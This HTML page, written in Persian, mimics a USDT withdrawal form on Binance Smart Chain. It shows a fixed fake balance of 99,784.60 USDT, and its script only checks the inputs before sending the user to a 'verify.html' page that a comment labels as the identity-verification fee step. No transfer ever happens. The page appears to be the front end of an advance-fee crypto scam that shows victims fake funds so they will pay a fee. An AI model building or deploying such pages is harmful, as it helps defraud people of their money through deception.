<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>برداشت تتر | Withdraw USDT</title>
    <style>
        body { background-color: #0b111a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #1a202c; padding: 30px; border-radius: 20px; width: 90%; max-width: 380px; border: 1px solid #2d3748; }
        h2 { font-size: 20px; margin-bottom: 25px; text-align: center; color: #f0b90b; }
        .input-group { margin-bottom: 20px; text-align: right; }
        label { display: block; font-size: 13px; color: #848e9c; margin-bottom: 8px; }
        input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #4a5568; background: #0b111a; color: white; box-sizing: border-box; text-align: left; outline: none; }
        input:focus { border-color: #f0b90b; }
        .balance-info { font-size: 12px; color: #48bb78; margin-top: 8px; display: block; text-align: right; }
        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; background-color: #f0b90b; color: black; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
        .network-hint { font-size: 11px; color: #718096; margin-top: 15px; text-align: center; }
    </style>
</head>
<body>

<div class="card">
    <h2>درخواست خروج سرمایه</h2>
    
    <div class="input-group">
        <label>آدرس کیف پول مقصد (BEP20)</label>
        <input type="text" id="target-addr" placeholder="0x..." required>
    </div>

    <div class="input-group">
        <label>مقدار برداشت (USDT)</label>
        <input type="number" id="amount" placeholder="0.00" required>
        <span class="balance-info">موجودی در دسترس 99,784.60 USDT</span>
    </div>

    <button class="btn" onclick="processWithdraw()">تأیید و انتقال</button>
    
    <div class="network-hint">
        تراکنش‌ها در شبکه هوشمند بایننس (BSC) پردازش می‌شوند.
    </div>
</div>

<script>
    function processWithdraw() {
        var addr = document.getElementById("target-addr").value;
        var amt = document.getElementById("amount").value;
        
        // چک کردن اینکه فیلدها پر شده باشند
        if(addr.length > 20 && amt > 0) {
            // انتقال به صفحه تایید هویت (کارمزد)
            window.location.href = "verify.html";
        } else {
            alert("لطفاً آدرس صحیح ولت BEP20 و مقدار برداشت را وارد کنید.");
        }
    }
</script>

</body>
</html>
